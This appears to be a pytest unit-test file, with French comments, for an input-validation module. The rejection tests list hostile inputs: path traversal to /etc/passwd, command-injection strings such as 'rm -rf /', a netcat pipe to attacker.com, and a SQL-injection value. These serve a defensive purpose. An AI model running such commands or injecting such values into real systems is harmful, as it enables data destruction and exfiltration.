#!/usr/bin/env python3
"""
Tests unitaires pour le module validators
Développé par Sebastien Poletto - Expert GSO Luxembourg
"""

import pytest
import sys
from pathlib import Path

# Ajouter le chemin parent pour importer les modules
sys.path.insert(0, str(Path(__file__).parent.parent))
from scripts.utils.validators import (
    validate_file_path, validate_domain, validate_api_key,
    validate_email, validate_search_query, validate_integer_range,
    sanitize_filename, PathValidator, DomainValidator, 
    EmailValidator, QueryValidator
)


class TestPathValidator:
    """Tests pour PathValidator"""
    
    def test_valid_path(self):
        """Test chemin valide"""
        result = validate_file_path("test.txt", must_exist=False)
        assert isinstance(result, Path)
    
    def test_path_traversal_attack(self):
        """Test protection contre path traversal"""
        with pytest.raises(ValueError, match="Caractère non autorisé"):
            validate_file_path("../../../etc/passwd")
    
    def test_null_bytes(self):
        """Test protection contre null bytes"""
        with pytest.raises(ValueError, match="Caractère non autorisé"):
            validate_file_path("test\x00.txt")
    
    def test_command_injection(self):
        """Test protection contre injection de commandes"""
        dangerous_paths = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
            "test $(id)",
            "test > /dev/null",
            "test < /etc/passwd"
        ]
        for path in dangerous_paths:
            with pytest.raises(ValueError):
                validate_file_path(path)
    
    def test_allowed_extensions(self):
        """Test validation extensions"""
        result = validate_file_path("test.txt", must_exist=False, allowed_extensions=[".txt"])
        assert result.suffix == ".txt"
        
        with pytest.raises(ValueError, match="Extension non autorisée"):
            validate_file_path("test.exe", must_exist=False, allowed_extensions=[".txt"])


class TestDomainValidator:
    """Tests pour DomainValidator"""
    
    def test_valid_domains(self):
        """Test domaines valides"""
        valid_domains = [
            "example.com",
            "sub.example.com",
            "example.co.uk",
            "test-domain.com",
            "123.example.com"
        ]
        for domain in valid_domains:
            result = validate_domain(domain)
            assert result == domain.lower()
    
    def test_domain_with_protocol(self):
        """Test nettoyage protocole"""
        assert validate_domain("https://example.com") == "example.com"
        assert validate_domain("http://example.com/path") == "example.com"
    
    def test_invalid_domains(self):
        """Test domaines invalides"""
        invalid_domains = [
            "example..com",
            "-example.com",
            "example-.com",
            "example.com-",
            "exam ple.com",
            "example.c",
            ""
        ]
        for domain in invalid_domains:
            with pytest.raises(ValueError):
                validate_domain(domain)
    
    def test_private_ip_rejection(self):
        """Test rejet IPs privées"""
        private_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "127.0.0.1",
            "localhost"
        ]
        for ip in private_ips:
            with pytest.raises(ValueError):
                validate_domain(ip)


class TestEmailValidator:
    """Tests pour EmailValidator"""
    
    def test_valid_emails(self):
        """Test emails valides"""
        valid_emails = [
            "test@example.com",
            "user.name@example.com",
            "user+tag@example.co.uk",
            "123@example.com"
        ]
        for email in valid_emails:
            result = validate_email(email)
            assert result == email.lower()
    
    def test_invalid_emails(self):
        """Test emails invalides"""
        invalid_emails = [
            "test@",
            "@example.com",
            "test@@example.com",
            "test.example.com",
            "test @example.com",
            "test@example",
            ""
        ]
        for email in invalid_emails:
            with pytest.raises(ValueError):
                validate_email(email)


class TestAPIKeyValidator:
    """Tests pour APIKeyValidator"""
    
    def test_valid_keys(self):
        """Test clés API valides"""
        valid_keys = [
            "sk-1234567890abcdef",
            "api_key_123456",
            "TOKEN-ABC-123",
            "1234567890"
        ]
        for key in valid_keys:
            result = validate_api_key(key)
            assert result == key.strip()
    
    def test_invalid_keys(self):
        """Test clés API invalides"""
        invalid_keys = [
            "key with spaces",
            "key;drop table",
            "key' OR '1'='1",
            "key\nheader: value",
            "key@#$%^&*()",
            "12345",  # Trop court
            ""
        ]
        for key in invalid_keys:
            with pytest.raises(ValueError):
                validate_api_key(key)


class TestQueryValidator:
    """Tests pour QueryValidator"""
    
    def test_valid_queries(self):
        """Test requêtes valides"""
        valid_queries = [
            "test query",
            "test AND query",
            "test 123",
            "test-query",
            "test_query"
        ]
        for query in valid_queries:
            result = validate_search_query(query)
            assert isinstance(result, str)
            assert len(result) > 0
    
    def test_control_chars_removal(self):
        """Test suppression caractères de contrôle"""
        result = validate_search_query("test\x00\x01\x02query")
        assert "\x00" not in result
        assert "\x01" not in result
        assert "\x02" not in result
    
    def test_excessive_special_chars(self):
        """Test suppression caractères spéciaux excessifs"""
        result = validate_search_query("test<<<>>>query")
        assert "<<<>>>" not in result
    
    def test_empty_after_cleaning(self):
        """Test requête vide après nettoyage"""
        with pytest.raises(ValueError, match="Requête vide"):
            validate_search_query("\x00\x01\x02")


class TestIntegerRangeValidator:
    """Tests pour validation plage entiers"""
    
    def test_valid_range(self):
        """Test valeurs dans la plage"""
        assert validate_integer_range(5, 1, 10) == 5
        assert validate_integer_range(1, 1, 10) == 1
        assert validate_integer_range(10, 1, 10) == 10
    
    def test_out_of_range(self):
        """Test valeurs hors plage"""
        with pytest.raises(ValueError, match="doit être >= 1"):
            validate_integer_range(0, 1, 10)
        
        with pytest.raises(ValueError, match="doit être <= 10"):
            validate_integer_range(11, 1, 10)
    
    def test_no_limits(self):
        """Test sans limites"""
        assert validate_integer_range(1000) == 1000
        assert validate_integer_range(-1000) == -1000


class TestSanitizeFilename:
    """Tests pour sanitize_filename"""
    
    def test_dangerous_chars_removal(self):
        """Test suppression caractères dangereux"""
        result = sanitize_filename('test<>:"/\\|?*.txt')
        assert all(char not in result for char in '<>:"/\\|?*')
    
    def test_length_limitation(self):
        """Test limitation longueur"""
        long_name = "a" * 300 + ".txt"
        result = sanitize_filename(long_name)
        assert len(result) <= 204  # 200 + ".txt"
    
    def test_reserved_names(self):
        """Test noms réservés Windows"""
        reserved = ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"]
        for name in reserved:
            result = sanitize_filename(name + ".txt")
            assert result.startswith("_")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])